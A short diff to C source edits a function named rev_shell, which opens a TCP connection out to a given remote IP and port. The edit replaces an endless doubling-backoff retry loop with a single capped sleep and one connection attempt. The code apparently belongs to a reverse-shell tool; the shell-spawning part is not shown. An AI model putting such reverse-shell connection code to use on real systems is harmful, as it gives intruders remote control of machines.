@@ -132,11 +132,16 @@ void rev_shell(char *rev_ip, uint16_t rev_port, unsigned int seconds) {
     addr.sin_port = htons(rev_port);
     inet_pton(AF_INET, rev_ip, &addr.sin_addr);
 
+    if(seconds > 300) seconds = 300;
+    LOG("Sleeping %u seconds then attempting to connect\n", seconds);
+    sleep(seconds);
+    
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    do {
-        sleep(seconds);
-        seconds *= 2;
-    } while((connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) != 0);
+
+    if ((connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) != 0) {
+        LOG("Failed to connect\n");
+        return;
+    }
 
     LOG("Connection on %s:%u\n", rev_ip, rev_port);
 
